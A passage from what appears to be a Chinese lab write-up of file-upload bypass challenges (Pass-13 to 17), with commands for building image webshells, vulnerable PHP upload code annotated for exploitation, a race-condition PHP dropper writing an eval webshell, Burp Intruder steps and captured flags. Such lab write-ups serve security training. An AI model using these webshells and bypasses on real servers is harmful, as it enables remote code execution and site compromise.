+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#998;font-style:italic># windows</span>
+</span></span><span style=display:flex><span>copy torjan.jpg/b + webshell.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># linux / mac</span>
+</span></span><span style=display:flex><span>cat webshell.php &gt;&gt; torjan.jpg
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>一张图片不行，换一张再试。</p></blockquote><p><strong>vim 二进制编辑</strong></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>vim -b yingtaozi.jpg
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>## vim 内</span>
+</span></span><span style=display:flex><span>%!xxd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># 编辑完</span>
+</span></span><span style=display:flex><span>%!xxd -r
+</span></span><span style=display:flex><span>:wq
+</span></span></code></pre></td></tr></table></div></div><p><strong>png</strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/99c656c95feae36ba97ca0bab58ffa15_33793.png></p><p><strong>gif</strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/3e4cc4f45f4ee6a9d8b943874888fc53_61847.png></p><p><strong>png</strong></p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/348c0f5b9e53602c2bb0136295f6dcc9_36139.png></p><pre tabindex=0><code>http://59.63.200.79:8016/Pass-13/upload/7520201223003243.gif
+http://59.63.200.79:8016/Pass-13/upload/8020201223003302.jpg
+http://59.63.200.79:8016/Pass-13/upload/3420201223003316.png
+
+# flag_Qg=ekeYD.txt : zkaq{h97@y9mvlFD2aaqX}
+</code></pre><ul><li>参考文档:
+<a href=https://xz.aliyun.com/t/2657 target=_blank rel=noopener>图片马制作</a></li></ul><h2 id=14-getimagesize图片类型绕过>14. getimagesize图片类型绕过</h2><pre tabindex=0><code>http://59.63.200.79:8016/Pass-14/upload//2020201223005056.gif
+http://59.63.200.79:8016/Pass-14/upload//3020201223005111.png
+
+# flag_g+E9dCHP.txt : zkaq{T4eh66ipeGQzVj1z}
+</code></pre><ul><li>参考文档:
+<a href=https://www.php.net/manual/zh/function.getimagesize.php target=_blank rel=noopener>getimagesize - php</a></li></ul><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;?</span>php
+</span></span><span style=display:flex><span>    <span style=color:teal>$types</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#d14>&#39;.jpeg|.png|.gif&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:teal>$ext</span> <span style=color:#000;font-weight:700>=</span> image_type_to_extension(<span style=color:teal>$info</span>[<span style=color:#099>2</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>// $info[2] 为 type
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>    <span style=color:#000;font-weight:700>list</span>(<span style=color:teal>$width</span>, <span style=color:teal>$height</span>, <span style=color:teal>$type</span>, <span style=color:teal>$attr</span>) <span style=color:#000;font-weight:700>=</span> getimagesize(<span style=color:#d14>&#34;img/flag.jpg&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#999;font-weight:700;font-style:italic>?&gt;</span><span style=color:#a61717;background-color:#e3d2d2>
+</span></span></span></code></pre></td></tr></table></div></div><p>经测试： 任何 jpg 格式都无法上传。</p><h2 id=15-php_exif模块图片类型绕过>15. php_exif模块图片类型绕过</h2><p>上传图片并下载</p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget -c http://nul03-b0a.aqlab.cn/Pass-15/upload//4020201223003325.gif
+</span></span><span style=display:flex><span>wget -c http://nul03-b0a.aqlab.cn/Pass-15/upload//3020201223003356.jpg
+</span></span><span style=display:flex><span>wget -c http://nul03-b0a.aqlab.cn/Pass-15/upload//1520201223003418.png
+</span></span></code></pre></td></tr></table></div></div><p>使用 grep 查看 <strong>一句话</strong> 是否还在</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/8af85975f1c9d9026171a1b4d1c3e75b_46531.png></p><p>本题暂无法利用<strong>文件解析漏洞</strong>， 未获取到 token</p><ul><li><a href=https://www.php.net/manual/zh/book.exif.php target=_blank rel=noopener>可交换图像信息 - php</a></li></ul><p><strong>源码分析</strong></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;?</span>php
+</span></span><span style=display:flex><span>    <span style=color:teal>$image_type</span> <span style=color:#000;font-weight:700>=</span> exif_imagetype(<span style=color:teal>$filename</span>);
+</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>switch</span> (<span style=color:teal>$image_type</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#000;font-weight:700>case</span> IMAGETYPE_GIF<span style=color:#000;font-weight:700>:</span>
+</span></span><span style=display:flex><span>            <span style=color:#000;font-weight:700>return</span> <span style=color:#d14>&#34;gif&#34;</span>;
+</span></span><span style=display:flex><span>            <span style=color:#000;font-weight:700>break</span>;
+</span></span></code></pre></td></tr></table></div></div><p>使用 <code>exif_imagetype</code> 读取文件元数据，获取文件类型信息。</p><p><strong>注意：在构造图片马时，不能破坏图片文件元数据信息</strong></p><h2 id=16-二次渲染绕过>16 二次渲染绕过</h2><ul><li><a href=https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE target=_blank rel=noopener>gif 图片马生成工具 - php</a></li><li><a href=https://secgeek.net/bookfresh-vulnerability/ target=_blank rel=noopener>BookFresh Tricky File Upload Bypass to RCE</a></li><li><a href=https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg target=_blank rel=noopener>利用PHP-GD imagecreatefromjpeg（）函数</a></li></ul><p>正常上传文件，获取渲染后的文件，使用二进制打开。获取渲染程序信息</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/a3be8e9cf8160157f64c70d6e2bc9164_58644.png></p><p>搜索相关文档，进行制马绕过。</p><blockquote><p>结论： 失败， 目前还没找到好的图片和插入点。 所有尝试都无法通过 imagecreatefromjpeg() 方法。</p></blockquote><p>参考文档:</p><ul><li><a href=https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg target=_blank rel=noopener>PHP-GD-imagecreatefromjpeg - 绕过研究 - github</a></li></ul><h3 id=二次上传利用-坑>二次上传利用 （坑）</h3><p><strong>分两步</strong></p><ol><li>上传正常文件，跑完正常逻辑， 获取图片地址。</li><li>【利用】先上传再验证，且验证失败不删除的代码逻辑。 上传图片马覆盖第一步生成的正常文件。</li><li>图片马上传成功。</li></ol><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;?</span>php
+</span></span><span style=display:flex><span><span style=color:teal>$is_upload</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#000;font-weight:700>false</span>;
+</span></span><span style=display:flex><span><span style=color:teal>$msg</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#000;font-weight:700>null</span>;
+</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>if</span> (isset(<span style=color:teal>$_POST</span>[<span style=color:#d14>&#39;submit&#39;</span>])){
+</span></span><span style=display:flex><span>    <span style=color:#998;font-style:italic>// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>    <span style=color:teal>$filename</span> <span style=color:#000;font-weight:700>=</span> <span style=color:teal>$_FILES</span>[<span style=color:#d14>&#39;upload_file&#39;</span>][<span style=color:#d14>&#39;name&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:teal>$filetype</span> <span style=color:#000;font-weight:700>=</span> <span style=color:teal>$_FILES</span>[<span style=color:#d14>&#39;upload_file&#39;</span>][<span style=color:#d14>&#39;type&#39;</span>];
+</span></span><span style=display:flex><span>    <span style=color:teal>$tmpname</span> <span style=color:#000;font-weight:700>=</span> <span style=color:teal>$_FILES</span>[<span style=color:#d14>&#39;upload_file&#39;</span>][<span style=color:#d14>&#39;tmp_name&#39;</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:teal>$target_path</span><span style=color:#000;font-weight:700>=</span><span style=color:teal>$UPLOAD_ADDR</span><span style=color:#000;font-weight:700>.</span>basename(<span style=color:teal>$filename</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#998;font-style:italic>// 获得上传文件的扩展名
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>    <span style=color:teal>$fileext</span><span style=color:#000;font-weight:700>=</span> substr(strrchr(<span style=color:teal>$filename</span>,<span style=color:#d14>&#34;.&#34;</span>),<span style=color:#099>1</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>/* 利用注释： 以上是上传 文件， 获取文件名等， 略过*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#998;font-style:italic>//判断文件后缀与类型，合法才进行上传操作
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>    <span style=color:#000;font-weight:700>if</span>((<span style=color:teal>$fileext</span> <span style=color:#000;font-weight:700>==</span> <span style=color:#d14>&#34;jpg&#34;</span>) <span style=color:#000;font-weight:700>&amp;&amp;</span> (<span style=color:teal>$filetype</span><span style=color:#000;font-weight:700>==</span><span style=color:#d14>&#34;image/jpeg&#34;</span>)){
+</span></span><span style=display:flex><span>        <span style=color:#000;font-weight:700>if</span>(move_uploaded_file(<span style=color:teal>$tmpname</span>,<span style=color:teal>$target_path</span>))
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            <span style=color:#998;font-style:italic>//使用上传的图片生成新的图片
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>            <span style=color:teal>$im</span> <span style=color:#000;font-weight:700>=</span> imagecreatefromjpeg(<span style=color:teal>$target_path</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#000;font-weight:700>if</span>(<span style=color:teal>$im</span> <span style=color:#000;font-weight:700>==</span> <span style=color:#000;font-weight:700>false</span>){
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>/* 利用注释： （第二次上传）
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>					1. 制作图片马， 保存为同名文件。 并点击上传。
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>					2. 提示非正常图片， imagecreatefromjpeg() 函数不过。 提示报错。
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>					注意： 当提示本报错的时候。 
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>					1. 图片已经上传， 【验证失败但未删除】。因此由于【与第一次文件生成文件同名】， 所以【有马覆盖无马】，从而造成利用。
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>					2. 如果这里有删除逻辑， 可以利用 【条件竞争方式】， 上传母马生成子马。
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:teal>$msg</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#d14>&#34;该文件不是jpg格式的图片！&#34;</span>;
+</span></span><span style=display:flex><span>            }<span style=color:#000;font-weight:700>else</span>{
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>/* 利用注释： （第一次上传）
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>						上传一张正常图片， 进行二次编码转换。
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>						目的：
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>						获取正常图片名称。
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic>*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#998;font-style:italic>//给新图片指定文件名
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>                srand(time());
+</span></span><span style=display:flex><span>                <span style=color:teal>$newfilename</span> <span style=color:#000;font-weight:700>=</span> strval(rand())<span style=color:#000;font-weight:700>.</span><span style=color:#d14>&#34;.jpg&#34;</span>;
+</span></span><span style=display:flex><span>                <span style=color:teal>$newimagepath</span> <span style=color:#000;font-weight:700>=</span> <span style=color:teal>$UPLOAD_ADDR</span><span style=color:#000;font-weight:700>.</span><span style=color:teal>$newfilename</span>;
+</span></span><span style=display:flex><span>                imagejpeg(<span style=color:teal>$im</span>,<span style=color:teal>$newimagepath</span>);
+</span></span><span style=display:flex><span>                <span style=color:#998;font-style:italic>//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>                <span style=color:teal>$img_path</span> <span style=color:#000;font-weight:700>=</span> <span style=color:teal>$UPLOAD_ADDR</span><span style=color:#000;font-weight:700>.</span><span style=color:teal>$newfilename</span>;
+</span></span><span style=display:flex><span>                unlink(<span style=color:teal>$target_path</span>);
+</span></span><span style=display:flex><span>                <span style=color:teal>$is_upload</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#000;font-weight:700>true</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#000;font-weight:700>else</span>
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>            <span style=color:teal>$msg</span> <span style=color:#000;font-weight:700>=</span> <span style=color:#d14>&#34;上传失败！&#34;</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>// 略
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span><span style=color:#000;font-weight:700>&gt;?</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=gif-制马>gif 制马</h3><ul><li><a href=https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE target=_blank rel=noopener>https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</a></li><li>[CVE-2019–19576 (Arbitrary file upload in class.upload.php)]https://medium.com/@jra8908/cve-2019-19576-e9da712b779</li><li><a href=https://secgeek.net/bookfresh-vulnerability/ target=_blank rel=noopener>https://secgeek.net/bookfresh-vulnerability/</a></li></ul><h3 id=flag>flag</h3><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://59.63.200.79:8016/Pass-16/upload/31563.jpg/.php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic># flag_4HQdz9RK.txt : zkaq{T68dYEhh5iWwcWs5}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=17-文件竞争>17 文件竞争</h2><p>利用方式：
+上传母马， 在服务器检测、移动、删除过程中。 强行访问母马生成子马。
+从而绕过检测。</p><ul><li><a href=https://www.php.net/manual/zh/function.file-put-contents.php target=_blank rel=noopener>file_put_contents - php</a>
+文件写入函数</li></ul><p><strong>创建母马</strong></p><div class=highlight><div style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#000;font-weight:700>&lt;?</span>php
+</span></span><span style=display:flex><span><span style=color:#998;font-style:italic>// 生产子马
+</span></span></span><span style=display:flex><span><span style=color:#998;font-style:italic></span>file_put_contents(<span style=color:#d14>&#39;2.php&#39;</span>,<span style=color:#d14>&#39;&lt;?php @eval(_REQUEST[8]);?&gt;&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#999;font-weight:700;font-style:italic>?&gt;</span><span style=color:#a61717;background-color:#e3d2d2>
+</span></span></span></code></pre></td></tr></table></div></div><p><strong>上传</strong></p><p>截断，并发送到 <strong>intruder</strong> 进行攻击</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/7d2e9937a61d892545f359dd4d52c71d_76997.png></p><p>设置 <strong>null payloads</strong>， 上传次数等</p><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/3343ca391aeea082c8c6e3c75666de55_86378.png></p><p><strong>产马</strong></p><p>上传任意图片，获取上传地址， 构造请求</p><pre tabindex=0><code>http://59.63.200.79:8016/Pass-17/upload/m-horse.php
+</code></pre><p><img class=mx-auto alt src=https://nc0.cdn.zkaq.cn/md/8461/b3c7da239ca9404e5e83752f585a5ee0_64335.png></p><p>设置 payload 信息
